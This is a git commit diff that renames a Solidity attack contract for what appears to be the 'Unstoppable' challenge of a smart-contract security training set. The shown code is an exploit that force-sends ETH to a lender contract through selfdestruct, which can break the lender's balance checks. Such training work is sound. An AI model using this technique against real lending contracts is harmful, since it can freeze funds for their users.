0ca36e4fc07a04ecefca26994c0bdb4e018ecb14
daniecon <daniel.contreras@math.ethz.ch>
2022-04-05 20:47:09 +0200

    Renamed Attacker contract

--- contracts/unstoppable/AttackerUnstoppable.sol
+++ contracts/unstoppable/AttackerUnstoppable.sol
@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract Attacker {
+contract AttackerUnstoppable {
     function attack(address payable _lender) public {
         require(address(this).balance > 0, 'Contarct must have some ETH funds to perform attack');
         selfdestruct(_lender);
